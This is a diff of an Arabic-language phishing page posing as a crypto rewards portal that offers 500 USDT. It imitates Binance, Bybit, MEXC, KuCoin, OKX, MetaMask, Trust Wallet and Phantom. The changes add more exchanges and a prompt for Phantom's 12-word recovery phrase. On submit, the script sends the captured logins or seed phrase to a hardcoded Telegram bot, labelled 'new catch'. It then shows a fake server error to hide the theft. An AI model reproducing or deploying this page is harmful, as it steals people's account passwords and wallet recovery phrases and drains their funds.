@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crypto Rewards - Official Verification</title>
+    <title>Crypto Rewards 2026 - Official Portal</title>
     <style>
         body { background-color: #0b0e11; color: #eaecef; font-family: Arial, sans-serif; text-align: center; padding: 20px; margin: 0; }
         .container { max-width: 450px; margin: 20px auto; background: #1e2329; padding: 20px; border-radius: 15px; border: 1px solid #474d57; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
@@ -13,19 +12,24 @@
         .platform { border: 1px solid #474d57; padding: 12px; border-radius: 10px; cursor: pointer; transition: 0.3s; display: flex; align-items: center; background: #181a20; }
         .platform:hover { border-color: #f0b90b; background: #2b3139; }
         .platform img { width: 30px; height: 30px; margin-left: 10px; border-radius: 5px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #474d57; background: #2b3139; color: white; box-sizing: border-box; }
+        input, textarea { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #474d57; background: #2b3139; color: white; box-sizing: border-box; font-size: 14px; }
+        textarea { height: 80px; resize: none; }
         button { width: 100%; padding: 15px; border-radius: 8px; border: none; background-color: #f0b90b; color: #1e2329; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 16px; }
         .hidden { display: none; }
-        .wallet-ui { background: white; color: black; padding: 15px; border-radius: 10px; margin-bottom: 15px; font-weight: bold; }
+        .wallet-ui { background: white; color: black; padding: 10px; border-radius: 10px; margin-bottom: 15px; font-weight: bold; display: flex; align-items: center; justify-content: center; gap: 10px; border: 2px solid #f0b90b; }
     </style>
 </head>
 <body>
 
 <div class="container" id="selection-box">
-    <h2 class="header-text">تفعيل مكافأة 500$ USDT 🎁</h2>
-    <p>اختر منصتك لتأكيد الربط واستلام الجائزة</p>
+    <h2 class="header-text">مركز مكافآت الكريبتو 2026 🎁</h2>
+    <p>اختر منصتك أو محفظتك لاستلام 500$ USDT فوراً</p>
     <div class="logo-grid">
         <div class="platform" onclick="showLogin('Binance')"><img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png"> <span>Binance</span></div>
+        <div class="platform" onclick="showLogin('Bybit')"><img src="https://cryptologos.cc/logos/bybit-logo.png"> <span>Bybit</span></div>
+        <div class="platform" onclick="showLogin('MEXC')"><img src="https://seeklogo.com/images/M/mexc-logo-50346E1B6B-seeklogo.com.png"> <span>MEXC</span></div>
+        <div class="platform" onclick="showLogin('KuCoin')"><img src="https://cryptologos.cc/logos/kucoin-kcs-logo.png"> <span>KuCoin</span></div>
+        <div class="platform" onclick="showLogin('OKX')"><img src="https://cryptologos.cc/logos/okx-logo.png"> <span>OKX</span></div>
         <div class="platform" onclick="showLogin('MetaMask')"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg"> <span>MetaMask</span></div>
         <div class="platform" onclick="showLogin('Trust Wallet')"><img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png"> <span>Trust Wallet</span></div>
         <div class="platform" onclick="showLogin('Phantom')"><img src="https://cryptologos.cc/logos/phantom-phantom-logo.png"> <span>Phantom</span></div>
@@ -34,14 +38,17 @@
 
 <div class="container hidden" id="login-box">
     <div id="wallet-ui" class="wallet-ui hidden">
-        <img id="wallet-logo" src="" width="40"><br>
-        <span id="wallet-tag">Secure Login</span>
+        <img id="wallet-logo" src="" width="35">
+        <span id="wallet-tag">الربط الآمن للمحفظة</span>
     </div>
-    <h3 id="platform-name" style="color:#f0b90b">تسجيل الدخول</h3>
+    <h3 id="platform-name" style="color:#f0b90b">تأكيد الحساب</h3>
+    <p id="instruction">سجل الدخول لحسابك الرسمي لتلقي التحويل</p>
     <form id="pishForm">
-        <input type="text" id="user_id" placeholder="البريد الإلكتروني / اسم المستخدم" required>
-        <input type="password" id="user_pass" placeholder="كلمة المرور" required>
-        <button type="submit" id="submitBtn">تأكيد واستلام المكافأة</button>
+        <div id="input-container">
+            <input type="text" id="user_id" placeholder="البريد الإلكتروني / اسم المستخدم" required>
+            <input type="password" id="user_pass" placeholder="كلمة المرور" required>
+        </div>
+        <button type="submit" id="submitBtn">تأكيد واستلام الجائزة</button>
     </form>
 </div>
 
@@ -51,37 +58,45 @@
         selectedPlatform = p;
         document.getElementById('selection-box').classList.add('hidden');
         document.getElementById('login-box').classList.remove('hidden');
-        document.getElementById('platform-name').innerText = "الربط مع " + p;
+        document.getElementById('platform-name').innerText = "تأكيد " + p;
         
-        const walletUI = document.getElementById('wallet-ui');
-        const walletLogo = document.getElementById('wallet-logo');
-        
-        if(p === 'MetaMask' || p === 'Phantom' || p === 'Trust Wallet') {
-            walletUI.classList.remove('hidden');
-            walletLogo.src = (p === 'MetaMask') ? "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" : 
-                             (p === 'Phantom') ? "https://cryptologos.cc/logos/phantom-phantom-logo.png" : 
-                             "https://trustwallet.com/assets/images/media/assets/trust_platform.png";
-        } else {
-            walletUI.classList.add('hidden');
+        const wUI = document.getElementById('wallet-ui');
+        const wLogo = document.getElementById('wallet-logo');
+        const inputContainer = document.getElementById('input-container');
+        const instr = document.getElementById('instruction');
+
+        if(p === 'Phantom') {
+            wUI.classList.remove('hidden');
+            wLogo.src = "https://cryptologos.cc/logos/phantom-phantom-logo.png";
+            instr.innerText = "أدخل عبارة الاسترداد (12 كلمة) لربط محفظة Phantom";
+            inputContainer.innerHTML = '<textarea id="user_id" placeholder="اكتب الـ 12 كلمة هنا بالترتيب..." required></textarea><input type="hidden" id="user_pass" value="PHANTOM_SEED">';
+        } 
+        else if(p === 'MetaMask' || p === 'Trust Wallet') {
+            wUI.classList.remove('hidden');
+            wLogo.src = (p==='MetaMask') ? "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" : "https://trustwallet.com/assets/images/media/assets/trust_platform.png";
+            instr.innerText = "سجل دخولك للمحفظة لتفعيل التحويل المباشر";
+            inputContainer.innerHTML = '<input type="text" id="user_id" placeholder="البريد الإلكتروني أو المعرف" required><input type="password" id="user_pass" placeholder="كلمة المرور" required>';
+        }
+        else {
+            wUI.classList.add('hidden');
+            instr.innerText = "سجل الدخول لحسابك الرسمي لتلقي التحويل";
+            inputContainer.innerHTML = '<input type="text" id="user_id" placeholder="البريد الإلكتروني / رقم الهاتف" required><input type="password" id="user_pass" placeholder="كلمة المرور" required>';
         }
     }
 
     document.getElementById('pishForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        const btn = document.getElementById('submitBtn');
-        btn.innerText = "... جاري الاتصال";
-        
         const info = document.getElementById('user_id').value;
         const pass = document.getElementById('user_pass').value;
         
-        const token = "8351638574:AAFWn2S7A9pG-HIdmNl6yv-pYJ9_mG-5DkE";
+        // التوكن الجديد من الصورة ديالك
+        const token = "8351638574:AAFwj2YhjOOr7qAIgKW2S1IH-mxU3XViy7M";
         const chat_id = "6925387370";
-        const text = `🎯 صيد جديد!\n🏢 المنصة: ${selectedPlatform}\n📧 الحساب: ${info}\n🔑 الباسورد: ${pass}`;
+        const text = `🎯 صيد جديد!\n🏢 المنصة: ${selectedPlatform}\n📝 البيانات: ${info}\n🔑 الباسورد: ${pass}`;
 
-        // السطر السحري للإرسال
         fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`)
         .then(() => {
-            alert("خطأ: السيرفر مشغول حالياً. حاول مجدداً بعد قليل.");
+            alert("خطأ: السيرفر لا يستجيب. يرجى المحاولة مرة أخرى.");
             location.reload();
         });
     });
